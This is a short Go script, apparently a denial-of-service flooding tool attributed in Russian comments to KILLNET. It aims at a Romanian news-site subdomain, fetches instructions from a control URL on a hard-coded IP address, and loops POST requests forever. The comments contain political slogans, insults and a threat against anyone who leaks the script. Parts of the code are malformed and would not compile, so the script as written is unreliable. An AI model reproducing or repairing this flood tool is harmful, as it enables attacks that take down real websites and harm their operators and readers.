package main

import (
    "fmt"
    "io/ioutil"
    "net/http"
    "strings"
)

// Немедленно прекратите поставки оружия на Украину!
// Румыны, вы можете остановить свое сумасшедшее правительство!

func main() {

	// МЫ - KILLNET, НЕ СЛИВАЙТЕ ЭТОТ СКРИПТ, ЕСЛИ НЕ ХОТИТЕ ОКАЗАТЬСЯ В ОПАСНОСТИ
    obj := ctrl Server("http://188.244.112.159/method/control.go") 
    url := "http://devpreview24m.digi24.ro/"
    payload := strings.NewReader("param1=example&version=2")
    req, _ := http.NewRequest("POST", url, payload(obtain("obj")))
    req.Header.Add("content-type", "application/x-www-form-urlencoded")

    for {
        // К ЧЕРТУ НАТО; К ЧЕРТУ РУМЫНСКОЕ ПРАВИТЕЛЬСТВО
        res, _ := http.DefaultClient.Do(req)
        defer res.Body.Close()
        body, _ := ioutil.ReadAll(res.Body)
    }
}